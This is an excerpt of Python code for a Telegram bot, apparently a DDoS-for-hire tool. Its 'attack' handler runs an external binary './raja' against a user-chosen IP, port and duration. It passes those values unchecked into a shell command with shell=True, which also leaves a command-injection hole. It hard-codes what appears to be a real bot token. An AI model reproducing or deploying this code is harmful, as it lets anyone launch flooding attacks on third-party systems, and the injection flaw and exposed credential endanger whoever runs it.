...
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        process = subprocess.Popen(f"./raja {ip} {port} {duration}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.communicate()
...
# Main function
def main():
    app = ApplicationBuilder().token("7932271333:AAHQO0eJdoa_tbEfrhvT55xByjc1XPFSrFQ").build()
